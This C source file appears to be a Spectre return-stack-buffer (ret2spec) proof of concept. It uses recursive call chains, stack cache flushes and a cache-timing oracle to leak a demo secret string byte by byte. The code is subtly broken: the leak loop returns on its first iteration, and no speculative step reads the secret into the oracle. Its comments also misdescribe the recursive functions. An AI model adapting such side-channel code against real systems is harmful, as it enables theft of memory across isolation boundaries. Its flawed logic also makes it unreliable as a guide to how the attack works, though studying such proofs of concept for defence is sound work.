#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#include "asm/measurereadlatency.h"
#include "cache_sidechannel_wrapper.h"  // <-- use wrapper API

#define CACHE_LINE_SIZE 64
#define MAX_RUNS 100000
#define K_RECURSION_DEPTH 30

// Pointer to the secret we want to leak
extern const char *private_data;
size_t current_offset;

// CacheSideChannel handle
CSCHandle csc = NULL;

// Forward declarations (defined in assembly)
void FlushDataCacheLineNoBarrier(const void *addr);
void MemoryAndSpeculationBarrier();
void ForceRead(const void *addr);

// Stack marks to track addresses in recursive calls for flushing
char *stack_marks[256];
int stack_index = 0;

// Global state for controlling speculative function execution
bool false_value = 0;
void (*return_true_base_case)();
void (*return_false_base_case)();

// Flush a stack region to evict return addresses
void FlushFromDataCache(const void *start, const void *end) {
    const uintptr_t begin = (uintptr_t)start;
    const uintptr_t stop = (uintptr_t)end;
    for (uintptr_t p = begin; p < stop; p += CACHE_LINE_SIZE) {
        FlushDataCacheLineNoBarrier((const void*)p);
    }
    MemoryAndSpeculationBarrier();
}

// Flush CacheSideChannel oracle
void FlushOracle() {
    CSC_FlushOracle(csc);
}

// Run timing check to determine best guess for speculatively accessed byte
char RecomputeScores(char safe_char) {
    char result = 0;
    CSC_RecomputeScores(csc, safe_char, &result);
    return result;
}

// Function that never returns true — used to pollute the RSB
void ReturnsFalse(int depth) {
    if (depth > 0) {
        ReturnsFalse(depth - 1);
    } else {
        return_true_base_case();
    }
}

// Function that always returns true — mispredicted to call ReturnsFalse
void ReturnsTrue(int depth) {
    char mark;
    stack_marks[stack_index++] = &mark;

    if (depth > 0) {
        ReturnsTrue(depth - 1);
    } else {
        return_false_base_case();
    }

    stack_index--;
    FlushFromDataCache(&mark, stack_marks[stack_index]);
}

// Attempt to leak one byte via speculative return and cache timing
char Ret2SpecLeakByte() {
    for (int run = 0; run < MAX_RUNS; ++run) {
        FlushOracle();

        char mark;
        stack_marks[0] = &mark;
        stack_index = 1;

        ReturnsTrue(K_RECURSION_DEPTH);

        stack_index = 0;

        char leaked = RecomputeScores((char)(run & 0xFF));
        return leaked;  // Always return — internal class handles confidence
    }

    fprintf(stderr, "Failed to converge\n");
    exit(1);
}

// No-op function used as base case in ReturnsFalse
void NopFunction() {}

// Triggers ReturnsFalse recursion chain
void ReturnsFalseStart() {
    ReturnsFalse(K_RECURSION_DEPTH);
}

// The secret to be leaked
const char *private_data = "It's a s3kr3t!!!";

int main() {
    // Initialize CacheSideChannel
    csc = CSC_Create();

    // Initialize speculative control functions
    return_true_base_case = NopFunction;
    return_false_base_case = ReturnsFalseStart;

    printf("Leaking secret: ");
    for (size_t i = 0; i < strlen(private_data); ++i) {
        current_offset = i;
        char c = Ret2SpecLeakByte();
        printf("%c", c);
        fflush(stdout);
    }

    printf("\nDone.\n");

    // Cleanup
    CSC_Destroy(csc);
    return 0;
}
